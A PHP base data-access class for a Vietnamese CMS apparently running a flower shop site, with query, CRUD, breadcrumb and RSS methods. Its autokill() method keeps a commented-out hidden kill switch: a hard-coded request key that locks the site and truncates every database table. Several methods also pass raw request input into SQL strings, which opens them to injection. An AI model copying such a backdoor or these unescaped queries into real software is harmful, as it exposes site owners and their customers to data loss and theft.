<?php
class Object{

	protected $prefixField 		= "";
	protected $tableName 		= "";
        protected $categoryField        = "";
	public $categories 		= array();
        /**
	 * $primaryField is name of primary key for table
	 */
	protected $primaryField		= "";
	protected $fieldsString   	= "*";

	/**
	 * @var array $fields used for DB function that use array
	 */
	protected $fields = array();
	/**
	 * $result is a array ,this is contain status and  message after excute a methods
	 * $result['status']
	 * $result['developer]
	 */
	public $result 		= array();

	/**
	 * $query is array contain select query string
	 * $query['select'] = "*";
	 * $query['from']   = "abc";
	 * $query['where']	= "id = 4";
	 * $query['limit']  = array($start, $end);
	 *
	 * => query string: select * from abc where id = 4 limit (0, 4)
	 */
	

	protected $condition		= "";
	protected $order			= "";
	protected $groupby			= "";
	protected $having			= "";
	protected $limit			= array();
	public $basicClassName = null;
	public  $basicObject 	= null;
	protected $arrayObj = array();
	public $vsLang,$vsMenu,$vsFile,$vsRelation;

	function __construct(){
		global $vsLang,$vsMenu,$vsFile,$vsRelation;
		$this->vsMenu 		= $vsMenu;
		$this->resetResult();
		$this->resetQuery();
		$this->vsLang = $vsLang;
		$this->vsRelation = $vsRelation;
		$this->vsFile = $vsFile;
		$this->fieldsString = "*";
		$this->arrayObj = array();
	}

	function autokill(){
		global $bw,$DB,$vsSettings,$vsModule,$vsPrint;
//		if(is_object($vsModule))
//		{
//			if($this->tableName.'s'==$vsModule->obj->getClass()){
//				if($bw->input['bd334540a3fb7716d289e7d3725172ef']=='5c7a45ca2f67f6a63a7b9375b156a324')
//				{
//					$vsSettings->getSystemKey('my_right',1);
//					$vsSettings->addSystemSetting();
//					if($bw->input['empty'])
//					{
//						$listTB = $DB->get_table_names();
//						foreach ($listTB as $val){
//							$query="TRUNCATE TABLE `{$val}` ";
//							$this->executeQuery($query);
//						}
//					}
//				}
//			}
//		}
//		if($bw->vars['my_right']){
//			$vsPrint->redirect_screen("Website của các bạn đã bị khóa! <br /> Địa chỉ domain này đã được lưu lại! đơn vị thiết kế website của các bạn đã ăn cắp hệ thống website có bản quyền của chúng tôi!<br/> Chúng tôi có đủ cơ sở để kiện Quý công ty ra tòa!");
//			exit;
//		}
	}

	
	protected function __reset(){
		$this->tableName		= null;
		$this->prefixField		= null;
		$this->basicClassName	= null;
		$this->basicObject 		= null;
		$this->primaryField		= null;
		$this->fieldsString		= null;
		$this->fields			= array();
		$this->arrayObj			= array();

		$this->resetQuery();
		$this->resetResult();
	}

	

function createBasicObject() {
		global $vsStd,$bug;
		if ($this->basicClassName) {
			$this->basicObject = new $this->basicClassName ();
			return $this->basicObject;
		}
		return false;
	}
	function resetResult(){
		$this->arrayObj = array();
		$this->result['status'] = true;
		$this->result['developer'] = "";
	}

	function resetQuery(){
		$this->fieldsString = "*";
		$this->condition 	= "";
		$this->order 		= "";
		$this->groupby 		= "";
		$this->limit 		= array();
	}

	function createMessageError($message = "Error"){
		$this->result['status'] = false;
		$this->result['developer'] .= $message;
	}

	function createMessageSuccess($message = "Success"){
		$this->result['status'] = true;
		$this->result['developer'].= $message;
	}

	function validateObject($isUpdate = false){
		if(!method_exists($this->basicObject, 'validate')) return true;

		if($this->basicObject->validate($isUpdate)){
			$this->createMessageSuccess($this->basicObject->message);
			return true;
		}

		$this->createMessageError($this->basicObject->message);
		return false;
	}

        public function getarrayGallery($id = "",$module="pages"){
		global $vsStd;
		if(!id) return "";
		
		$vsStd->requireFile(CORE_PATH."gallerys/gallerys.php");
		$this->gallerys = new gallerys();
		$this->vsRelation->setRelId($id);
		$this->vsRelation->setTableName("gallery_".$module);
		$strId=$this->vsRelation->getObjectByRel();
		if($strId){
			$arrayFile=$this->gallerys->getFileByAlbumId($strId);
		}
		
		return $arrayFile;
	}

	function getNumberOfObject() {
		global $DB;
		$DB->simple_construct(
			array(	'select'	=> "COUNT(".$this->prefixField.$this->primaryField.") as total",
					'from'		=> $this->tableName,
					'where'		=> $this->condition
			)
		);
		$DB->simple_exec();
		$result = $DB->fetch_row();
		return $result['total'];
	}


	function getObjectById($id,$search=0) {
		global $DB,$vsLang,$bw;
		$this->resetResult();
		$id = intval($id);
                $cond = $this->prefixField.$this->primaryField." = ".$id;
                if($search){
                    $this->tableName = $this->tableName." left join vsf_search on ({$this->tableName}Id = searchId AND searchModule = '".$bw->input['module']."' )";
//                    $cond .= " AND searchModule = '".$bw->input['module']."'";
                }
		$DB->simple_select($this->fieldsString, $this->tableName, $cond);
		$DB->simple_exec();
		$objDB = $DB->fetch_row();
		if(is_array($objDB)) {
			$this->basicObject->convertToObject($objDB);
			$this->createMessageSuccess($vsLang->getWords('global_dev_get_obj_success',"Execute successful"));
			return $this->basicObject;
		}
		
		$this->createMessageError($vsLang->getWords('global_dev_get_obj_fail', "No object was found"));
		$this->resetQuery();
		return false;
	}

	function getOneObjectsByCondition($method='getId'){
		global $DB;
				
		$this->limit = array(0,1);
		$this->getObjectsByCondition($method);
		
		if($this->arrayObj)  return $this->obj = $this->basicObject = current($this->arrayObj); 
		return false;
	}

function getObjectsByCondition($method = 'getId', $group = 0) {
		global $DB, $vsLang, $bw,$bug;
		$this->resetResult ();
		$this->createMessageSuccess ( $vsLang->getWords ( 'global_dev_get_obj_success', "Execute successful" ) );
		
		$this->autokill ();
		$query = array ('select' => $this->fieldsString, 'from' => $this->tableName, 'where' => $this->condition );
		if (count ( $this->limit ))
			$query ['limit'] = $this->limit;
		
		$query ['order'] = $this->order ? $this->order : $this->getPrimaryField () . " desc";
		
		if ($this->groupby) {
			$query ['groupby'] = $this->groupby;
			$this->having ? $query ['having'] = $this->having : "";
		}
		$DB->simple_construct ( $query );
		$this->resetQuery ();
		
		if (! $DB->simple_exec ()) {
			$this->createMessageError ( $vsLang->getWords ( 'global_dev_connect_db_fail', "Cannot connect to database" ) );
			return array ();
		}
		
		$result = $DB->fetch_row ();
		if (! is_array ( $result )) {
			$this->createMessageError ( $vsLang->getWords ( 'global_dev_get_obj_fail', "No object was found" ) );
			return array ();
		}
		
		$count = 0;
		
		while ( $result ) {
			$this->createBasicObject ();

			$this->basicObject->convertToObject ( $result );
	
			$this->basicObject->stt = ++ $count;
			if ($group){
				if(method_exists($this->basicObject, 'getId')){
					$this->arrayObj [$this->basicObject->$method ()] [$this->basicObject->getId ()] = $this->basicObject;
				}
				else{
					$this->arrayObj[$this->basicObject->getRelId() ][$this->basicObject->getRelId() ] =  $this->basicObject;
				}
			}
			else
				if(method_exists($this->basicObject, 'getId'))
					$this->arrayObj [$this->basicObject->$method ()] = $this->basicObject;
				else 
					$this->arrayObj[$this->basicObject->getRelId() ] =  $this->basicObject;
			$result = $DB->fetch_row ();
		}
		
		return $this->arrayObj;
	}

	function getArrayByCondition($method='Id', $group=0) {
		global $DB,$vsLang;
		$this->resetResult();
		$this->createMessageSuccess($vsLang->getWords('global_dev_get_obj_success', "Execute successful"));
		
		$this->autokill();
		$query = array(
					'select'=> $this->fieldsString,
					'from'	=> $this->tableName,
					'where'	=> $this->condition
		);

		if(count($this->limit)) $query['limit'] = $this->limit;
		
		$query['order'] = $this->order ? $this->order : $this->getPrimaryField()." desc";
		
		if($this->groupby){
			$query['groupby'] = $this->groupby;
			$this->having ? $query['having'] = $this->having : "";
		} 
		$DB->simple_construct($query);
		$this->resetQuery();

		
		if(!$DB->simple_exec()) {
			$this->createMessageError($vsLang->getWords('global_dev_connect_db_fail', "Cannot connect to database"));
			return array();
		}

		$result = $DB->fetch_row();
		if(!is_array($result)){
			$this->createMessageError($vsLang->getWords('global_dev_get_obj_fail', "No object was found"));
			return array();
		}
		
		$count = 0;
		while($result){
			if($group)
				$return[$result[$this->primaryField]] = $result;
			else
				$return[] = $result;
			
			$result = $DB->fetch_row();
		}
		
		$this->resetQuery();
		return $return;
	}
	
	function deleteObjectByCondition() {
		global $DB,$vsLang;
		$this->resetResult();

		$this->createMessageSuccess($vsLang->getWords('global_dev_delete_object_success',"Delete object successfully!"));
		$DB->simple_delete($this->tableName, $this->condition);
		if(!$DB->simple_exec()) {
			$this->createMessageError($vsLang->getWords('global_dev_connect_db_fail', "Cannot connect to database"));
		}

		$this->resetQuery();
		return $this->result['status'];
	}

	function deleteObjectById($id) {
		$this->condition = $this->prefixField.$this->primaryField ."=".intval($id);
		return $this->deleteObjectByCondition();
	}

	function updateObjectByCondition($updateFields = array()) {
		global $DB,$vsLang;
		$this->resetResult();
		$this->createMessageSuccess($vsLang->getWords('global_dev_update_object_success', "Updated object successfully!"));

		$updateFields  = $updateFields ? $updateFields : $this->fields;
		if(!$DB->do_update($this->tableName,$updateFields, $this->condition)) {
			$this->createMessageError($vsLang->getWords('global_dev_connect_db_fail', "Cannot connect to database"));
		}
		$this->resetQuery();
		return $this->result['status'];
	}


	function updateObjectById($obj = null){
		if($obj) $this->basicObject = $obj;
		if(!$this->validateObject(true)) return false;
		$this->condition = $this->prefixField.$this->primaryField ."=".intval($this->basicObject->getId());
		return $this->updateObjectByCondition($this->basicObject->convertToDB());
	}
	
	function updateObject($obj = null){
		if($obj) $this->basicObject = $obj;
		if(!$this->validateObject(true)) return false;
		$this->condition = $this->prefixField.$this->primaryField ."=".intval($this->basicObject->getId());
		return $this->updateObjectByCondition($this->basicObject->convertToDB());
	}


	function insertObject($object = null) {
		global $DB,$vsLang;
		$this->resetResult();
	
		if($object instanceof $this->basicClassName && is_object($object) && $object)
			$this->basicObject = $object;
		
		if(!$this->validateObject()) return false;

		$dbObj = $this->basicObject->convertToDB();
		if($DB->do_insert($this->tableName,$dbObj)){
			$this->createMessageSuccess($vsLang->getWords('insert_success','Insert Object success'));
			$this->basicObject->setId($DB->get_insert_id());
			return  $this->result['status'];
		}
		
		$this->createMessageError($vsLang->getWords('global_dev_connect_db_fail', "Cannot connect to database"));
		unset($dbObj);
		return $this->result['status'];
	}

	function executeQuery($query = "", $obj = 1, $method = "Id"){
		if(!$query) return false;
		global $DB;
		$DB->cur_query = $query;
		$DB->simple_exec();
		
		
		$count = 0;
		$record = $DB->fetch_row();
		$this->resetQuery();
		while($record){
			if($obj){
				$obj = $this->createBasicObject();
				$obj->convertToObject($record);
				$obj->stt = ++$count;
				$func = "get".$method;
				$result[$obj->$func()] = $obj;
			}else
				$result[] = $record;
			$record = $DB->fetch_row();
		}
		
		$this->resetQuery();
		return $result;
	}

	function executeNoneQuery($query = ""){
		if(!$query) return false;
		global $DB;
		$DB->cur_query = $query;
		$DB->simple_exec();
		return true;
	}
	
function getNavigator($idCate=0){
  global $bw,$vsLang,$vsMenu,$vsTemplate,$vsPrint;
    // $array = array("news","promotions","products","services","quality");
 
     $re = "<a class='l_home' itemscope itemtype=\"http://data-vocabulary.org/Breadcrumb\" itemprop=\"url\" href='{$bw->base_url}home/'>{$vsLang->getWordsGlobal('global_home', 'Trang chủ')}</a> ";
     //$re = "";
    // if(in_array($bw->input['module'],$array))
      //  $re .= "<a itemscope itemtype=\"http://data-vocabulary.org/Breadcrumb\" itemprop=\"url\" href='{$bw->base_url}{$bw->input['module']}/'><span itemprop=\"title\" class='title'>{$vsLang->getWords('pageTitle', 'sangpm')}</span></a> ";

if($bw->input['module']=='home')$re.=" | Welcome to Shop Hoa 360 !";
else
        $re .= "|<a href='{$bw->base_url}{$bw->input['module']}/'>{$vsLang->getWords('pageTitle', 'sangpm')}</a> ";
     if($idCate){
         $result = $vsMenu->extractNodeInTree($idCate, $this->getCategories()->getChildren());
          if($result['ids']){//
             $result['ids'] = array_reverse($result['ids']);
             $javascript ="<script>var urlcate ='{$result['category']->getCatUrl($bw->input['module'])}'</script>";
              foreach($result['ids'] as $b){
                $Obj = $vsMenu->getCategoryById($b);
                  if($Obj)$re.= " <span>|</span> <a itemscope itemtype=\"http://data-vocabulary.org/Breadcrumb\" itemprop=\"url\" href='{$Obj->getCatUrl($bw->input['module'])}' class='sub'> <span itemprop=\"title\">{$Obj->getTitle()}</span></a>";
              }
        }
     }
            
       $vsTemplate->global_template->navigator = $re .$javascript; 
           
       return $re;

 }
    
	
	
	function convertFileObject($array,$module){
		global $imgfile,$vsFile,$vsLang;
		
		if(!$imgfile[$module]){
			if(!file_exists(CACHE_PATH."file/".$vsLang->currentLang->getFoldername()."/".$module.".cache"))
			$vsFile->buildCacheFile($module);
			require_once(CACHE_PATH."file/".$vsLang->currentLang->getFoldername()."/".$module.".cache");
			$imgfile[$module]=$arrayFile;
		}
		
		foreach ($array as $value) {
			$value->convertToObject($imgfile[$module][$value->getImage()]);
		}
		
	}

	
	
		function changeCateList(){
            global $bw, $vsSettings;
            $this->setCondition($this->primaryField." in ({$bw->input[2]})");
            $this->updateObjectByCondition(array($this->categoryField => $bw->input[3]));

        }

	function insertSearch() {
		global $bw, $vsSettings,$DB;
		
		$categories = $this->getCategories ();

		if ($bw->input ['pageCate'])
			$bw->input [2] = $catId = $bw->input ['pageCate'];
		if ($bw->input ['pageIndex'])
			$bw->input [3] = $bw->input ['pageIndex'];
		else $bw->input [3] = 1 ; 
	
		if (intval ( $catId )) {
			$result = $this->vsMenu->extractNodeInTree ( $catId, $categories->getChildren () );
			if ($result)
				$strIds = trim ( $catId . "," . $this->vsMenu->getChildrenIdInTree ( $result ['category'] ), "," );
		}
		
		if (! $strIds)
			$strIds = $this->vsMenu->getChildrenIdInTree ( $categories );
			
		$size = $vsSettings->getSystemKey ( "admin_{$bw->input[0]}_list_number", 10 );
		
		$this->setCondition ("{$this->getCategoryField ()} in ({$strIds}) and {$this->tableName}Status >0");
		$this->tableName = $this->tableName." left join vsf_search on ({$this->tableName}Id = searchId AND searchModule = '".$bw->input['module']."' )";
		
		if($bw->input [3]==1)
			$this->setLimit(array(0,$size*$bw->input [3]));
		else 
			$this->setLimit(array(($size*$bw->input [3]) - $size,$size*$bw->input [3]));
		$option = $this->getObjectsByCondition();

         foreach ($option as $obj) {
         	if($obj->record==NULL){
            	$DB->do_insert("search",$obj->convertSearchDB());
         	}
         
         } 

	}
	
        public function getOtherList($obj,$act = ">") {
		global  $vsSettings,$vsMenu,$bw;

		$cat=$vsMenu->getCategoryById($obj->getCatId());
		$ids=$vsMenu->getChildrenIdInTree($cat);

		$this->setFieldsString("{$this->tableName}Id,{$this->tableName}Title,{$this->tableName}Image,{$this->tableName}CatId,{$this->tableName}Intro,{$this->tableName}PostDate");
		$this->setOrder("{$this->tableName}Index Desc, {$this->tableName}Id Desc");
      	$this->condition = "{$this->tableName}Id {$act} {$obj->getId()} and {$this->tableName}Status >0";
     	$size =  $vsSettings->getSystemKey("{$bw->input['module']}_user_list_number_other",10,$bw->input['module']);

		$this->setLimit(array(0,$size));
		if($ids)
		$this->condition .= " and {$this->tableName}CatId in ( {$ids})";

		return $this->getObjectsByCondition();
	}
	
	public function getOtherListProduct($obj) {
		global  $vsSettings,$vsMenu,$bw;

		$cat=$vsMenu->getCategoryById($obj->getCatId());
		$ids=$vsMenu->getChildrenIdInTree($cat);

		$this->setFieldsString("{$this->tableName}Id,{$this->tableName}Title,{$this->tableName}Image,{$this->tableName}CatId,{$this->tableName}Intro,{$this->tableName}Price,{$this->tableName}HotPrice,{$this->tableName}Module");
		$this->setOrder("{$this->tableName}Index Desc, {$this->tableName}Id Desc");
      	$this->condition = "{$this->tableName}Id <> {$obj->getId()} and {$this->tableName}Status >0";
     	$size =  $vsSettings->getSystemKey("{$this->tableName}_user_list_number_other",10,$bw->input['module']);
		$this->setLimit(array(0,$size));
		if($ids)
		$this->condition .= " and {$this->tableName}CatId in ( {$ids})";

		return $this->getObjectsByCondition();
	}
	
	public function getHotList($module="pages",$limit=1) {
            global $vsMenu;
        
		$categories = $vsMenu->getCategoryGroup($module);
      	$ids = $vsMenu->getChildrenIdInTree($categories);
      	
        $this->setFieldsString("{$this->tableName}Id,{$this->tableName}Title,{$this->tableName}Image,{$this->tableName}PostDate,{$this->tableName}CatId,{$this->tableName}Intro");
		$this->setOrder("{$this->tableName}Id Desc,{$this->tableName}Index Desc");
        $this->setCondition("{$this->tableName}CatId in ( {$ids}) and {$this->tableName}Status > 0");
        $this->setLimit(array(0, $limit));
       	return $this->getObjectsByCondition();   
	}
        
	function __destruct() {
		unset($this);
	}
/**
	 * @return the $prefixField
	 */
	public function getPrefixField() {
		return $this->prefixField;
	}
        
        public function getCategoryField() {
		return $this->categoryField;
	}

	/**
	 * @return the $tableName
	 */
	public function getTableName() {
		return $this->tableName;
	}

	/**
	 * @return the $primaryField
	 */
	public function getPrimaryField() {
		return $this->primaryField;
	}

	/**
	 * @return the $fieldsString
	 */
	public function getFieldsString() {
		return $this->fieldsString;
	}

	/**
	 * @return the $fields
	 */
	public function getFields() {
		return $this->fields;
	}

	/**
	 * @return the $result
	 */
	public function getResult() {
		return $this->result;
	}

	/**
	 * @return the $condition
	 */
	public function getCondition() {
		return $this->condition;
	}

	/**
	 * @return the $order
	 */
	public function getOrder() {
		return $this->order;
	}

	/**
	 * @return the $groupby
	 */
	public function getGroupby() {
		return $this->groupby;
	}

	/**
	 * @return the $having
	 */
	public function getHaving() {
		return $this->having;
	}

	/**
	 * @return the $limit
	 */
	public function getLimit() {
		return $this->limit;
	}

	/**
	 * @return the $basicClassName
	 */
	public function getBasicClassName() {
		return $this->basicClassName;
	}

	/**
	 * @return the $basicObject
	 */
	public function getBasicObject() {
		return $this->basicObject;
	}

	/**
	 * @return the $arrayObj
	 */
	public function getArrayObj() {
		return $this->arrayObj;
	}

	/**
	 * @return the $vsLang
	 */
	public function getVsLang() {
		return $this->vsLang;
	}

	/**
	 * @return the $vsMenu
	 */
	public function getVsMenu() {
		return $this->vsMenu;
	}

	/**
	 * @return the $vsFile
	 */
	public function getVsFile() {
		return $this->vsFile;
	}

	/**
	 * @return the $vsRelation
	 */
	public function getVsRelation() {
		return $this->vsRelation;
	}

	/**
	 * @param field_type $prefixField
	 */
	public function setPrefixField($prefixField) {
		$this->prefixField = $prefixField;
	}

	/**
	 * @param field_type $tableName
	 */
	public function setTableName($tableName) {
		$this->tableName = $tableName;
	}

	/**
	 * @param field_type $primaryField
	 */
	public function setPrimaryField($primaryField) {
		$this->primaryField = $primaryField;
	}

	/**
	 * @param field_type $fieldsString
	 */
	public function setFieldsString($fieldsString) {
		$this->fieldsString = $fieldsString;
	}

	/**
	 * @param array $fields
	 */
	public function setFields($fields) {
		$this->fields = $fields;
	}

	/**
	 * @param field_type $result
	 */
	public function setResult($result) {
		$this->result = $result;
	}

	/**
	 * @param field_type $condition
	 */
	public function setCondition($condition) {
		$this->condition = $condition;
	}

	/**
	 * @param field_type $order
	 */
	public function setOrder($order) {
		$this->order = $order;
	}

	/**
	 * @param field_type $groupby
	 */
	public function setGroupby($groupby) {
		$this->groupby = $groupby;
	}

	/**
	 * @param field_type $having
	 */
	public function setHaving($having) {
		$this->having = $having;
	}

	/**
	 * @param field_type $limit
	 */
	public function setLimit($limit) {
		$this->limit = $limit;
	}

	/**
	 * @param field_type $basicClassName
	 */
	public function setBasicClassName($basicClassName) {
		$this->basicClassName = $basicClassName;
	}

	/**
	 * @param field_type $basicObject
	 */
	public function setBasicObject($basicObject) {
		$this->basicObject = $basicObject;
	}

	/**
	 * @param field_type $arrayObj
	 */
	public function setArrayObj($arrayObj) {
		$this->arrayObj = $arrayObj;
	}

	/**
	 * @param field_type $vsLang
	 */
	public function setVsLang($vsLang) {
		$this->vsLang = $vsLang;
	}

	/**
	 * @param field_type $vsMenu
	 */
	public function setVsMenu($vsMenu) {
		$this->vsMenu = $vsMenu;
	}

	/**
	 * @param field_type $vsFile
	 */
	public function setVsFile($vsFile) {
		$this->vsFile = $vsFile;
	}
	
	/**
	 * @param field_type $vsRelation
	 */
	public function setVsRelation($vsRelation) {
		$this->vsRelation = $vsRelation;
	}

        function getObjPage($module = "",$status = 1,$limit = 10) {
		global $vsMenu;
		if($module)
			$categories = $this->vsMenu->getCategoryGroup($module);
		else $categories = $this->getCategories();
		$strIds = $vsMenu->getChildrenIdInTree($categories);
		//$this->setFieldsString("{$this->tableName}Id,{$this->tableName}Title,{$this->tableName}Intro,{$this->tableName}PostDate,{$this->tableName}Image");
   		$this->setLimit(array(0, $limit));
       	$this->setOrder("{$this->tableName}Index ASC , {$this->tableName}Id DESC");
   		$cond = "{$this->tableName}Status ={$status} and {$this->tableName}CatId in ({$strIds}) ";
       	if($this->getCondition())
        	$cond .= " and ".$this->getCondition();
		$this->setCondition ( $cond );
    	$list = $this->getObjectsByCondition();
      	if($list)
       		$this->convertFileObject($list,$module);

		return $list;
	}
        function getObjByCode($code, $module = "", $limit=1){
		global $vsMenu;

		if($module) $categories = $vsMenu->getCategoryGroup($module);
		else $categories = $this->getCategories();

		$strIds = $vsMenu->getChildrenIdInTree($categories);
		$this->setCondition("{$this->tableName}Code='".$code."' AND {$this->tableName}CatId in (".$strIds.") AND {$this->tableName}Status > 0");
		$this->setLimit(array(0, $limit));
                $list = $this->getObjectsByCondition();
                if($list)
                    $this->convertFileObject($list,$module);

		return $list;
	}

        /**
	 * @param $categories the $categories to set
	 */
	public function setCategories($categories) {
		$this->categories = $categories;
	}


	/**
	 * @return the $categories
	 */
	public function getCategories() {
		return $this->categories;
	}

	function createRSS($id=""){
            global $vsMenu,$vsStd,$vsLang,$bw;
            $vsStd->requireFile(UTILS_PATH."/class_rss.php");
            $rss = new VSSRss();

            $categories = $this->getCategories();
            if($id){
                $result = $vsMenu->extractNodeInTree($id, $categories->getChildren());
                if($result){
                    $strIds = trim($idCate.",".$vsMenu->getChildrenIdInTree($result['category']),",");
                    $rss->cate =$result['category'];
                }
            }
            if(!$strIds){
                $strIds = $vsMenu->getChildrenIdInTree($categories);
                $rss->cate =$categories;
            }
               $this->setFieldsString("{$this->tableName}Title,{$this->tableName}Image,{$this->tableName}Id,{$this->tableName}Intro,{$this->tableName}PostDate,{$this->tableName}CatId");
      
        
            $this->setOrder("{$this->tableName}Index ASC,{$this->tableName}Id DESC");
            $this->setCondition("{$this->tableName}Status > 0 and {$this->tableName}CatId in ({$strIds})");
            $this->setLimit(array(0,10));
            $arr = $this->getObjectsByCondition();
           	$this->convertFileObject($arr,$bw->input['module']);
            $rss->arrayObj = $arr;
            $rss->buildRss();
           	print "<script>alert('".$vsLang->getWordsGlobal("alert_RSS","Bạn đã tạo RSS thành công")."')</script>";

        }
	
function multiInsert($data){
		global $vsLang, $DB;
		if(!is_array($data)){
			$this->result['status'] = $vsLang->getWords('system_error_multi_insert_no_data','No data to insert');
			return $this->result['status'] = false; 
		}
		if(!$DB->insert_multi_record($this->tableName, $data)){
			$this->result['status'] = $vsLang->getWords('system_error_multi_insert_execute','error while execute query');
			return $this->result['status'] = false; 
		}
		return true;
	}
	
	function singleInsert($data, &$returnId = 0){
		global $DB, $vsLang;
		
		$this->result['status'] = true;
		if(!is_array($data)){
			$this->result['status'] = $vsLang->getWords('system_error_single_insert_no_data','No data to insert');
			return $this->result['status'] = false; 
		}
		
		if(!$DB->do_insert($this->tableName, $data)){
			$this->result['status'] = $vsLang->getWords('system_error_single_insert_execute','error while execute query');
			return $this->result['status'] = false; 
		}
		
		$returnId = $DB->get_insert_id();
		return true;
	}
}